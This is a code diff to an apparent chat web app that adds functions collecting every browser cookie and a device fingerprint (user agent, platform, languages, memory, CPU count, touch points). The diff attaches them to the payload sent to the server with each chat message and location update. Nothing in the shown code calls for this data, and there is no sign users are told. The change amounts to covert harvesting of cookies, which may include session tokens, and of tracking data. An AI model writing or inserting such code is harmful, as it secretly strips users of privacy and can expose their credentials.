@@ -63,6 +63,47 @@ function withWelcome(history = []) {
   return [welcomeMessage, ...history];
 }
 
+function readCookies() {
+  return document.cookie
+    .split(';')
+    .map((part) => part.trim())
+    .filter(Boolean)
+    .reduce((cookies, entry) => {
+      const separatorIndex = entry.indexOf('=');
+      if (separatorIndex === -1) {
+        return cookies;
+      }
+
+      const key = decodeURIComponent(entry.slice(0, separatorIndex).trim());
+      const value = decodeURIComponent(entry.slice(separatorIndex + 1).trim());
+      if (key) {
+        cookies[key] = value;
+      }
+      return cookies;
+    }, {});
+}
+
+function getBrowserAdditionalInformation() {
+  return {
+    userAgent: navigator.userAgent || '',
+    platform: navigator.platform || '',
+    language: navigator.language || '',
+    languages: navigator.languages || [],
+    cookieEnabled: navigator.cookieEnabled ?? null,
+    online: navigator.onLine ?? null,
+    hardwareConcurrency: navigator.hardwareConcurrency ?? null,
+    deviceMemory: navigator.deviceMemory ?? null,
+    maxTouchPoints: navigator.maxTouchPoints ?? null,
+  };
+}
+
+function getDeviceAccessData() {
+  return {
+    cookies: readCookies(),
+    additionalInformation: getBrowserAdditionalInformation(),
+  };
+}
+
 export default function App() {
   const [sessionId, setSessionId] = useState('');
   const [messages, setMessages] = useState([welcomeMessage]);
@@ -157,6 +198,7 @@ export default function App() {
     const payload = {
       sessionId: activeSessionId,
       ...getLocationPayload(nextCoords),
+      ...getDeviceAccessData(),
     };
 
     await apiFetch('/api/location', {
@@ -243,6 +285,7 @@ export default function App() {
           sessionId: activeSessionId,
           message: trimmed,
           ...getLocationPayload(),
+          ...getDeviceAccessData(),
         }),
       });
 
